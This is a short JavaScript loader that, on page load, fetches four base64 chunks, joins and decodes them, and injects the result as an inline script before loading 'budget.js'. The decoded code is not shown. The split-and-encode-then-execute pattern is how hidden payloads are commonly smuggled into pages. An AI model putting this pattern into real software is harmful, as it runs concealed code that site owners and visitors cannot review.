(async function () {
  var parts = await Promise.all([0,1,2,3].map(function (i) {
    return fetch("aj" + i + ".b64").then(function (r) { return r.ok ? r.text() : ""; });
  }));
  var s = document.createElement("script");
  s.textContent = atob(parts.join(""));
  document.head.appendChild(s);
  var b = document.createElement("script");
  b.src = "budget.js";
  document.head.appendChild(b);
})();
